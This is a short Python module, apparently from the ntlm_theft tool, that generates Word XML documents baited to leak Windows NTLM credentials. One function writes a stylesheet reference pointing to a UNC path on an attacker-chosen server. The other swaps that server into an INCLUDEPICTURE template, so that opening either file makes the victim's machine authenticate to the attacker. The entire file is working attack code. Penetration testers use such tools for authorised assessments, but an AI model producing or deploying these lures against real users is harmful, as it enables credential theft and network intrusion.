#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
from ntlm_theft.files import script_directory


def create_xml(generate, server, filename):
    file = open(filename, "w")
    file.write(
        """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?mso-application progid="Word.Document"?>
<?xml-stylesheet type="text/xsl" href="\\\\"""
        + server
        + """\\bad.xsl" ?>"""
    )
    file.close()
    print("Created: " + filename + " (OPEN)")


def create_xml_includepicture(generate, server, filename):
    documentfilename = os.path.join(
        script_directory, "templates", "includepicture-template.xml"
    )
    file = open(documentfilename, "r", encoding="utf8")
    filedata = file.read()
    file.close()
    filedata = filedata.replace("127.0.0.1", server)
    file = open(filename, "w", encoding="utf8")
    file.write(filedata)
    file.close()
    print("Created: " + filename + " (OPEN)")
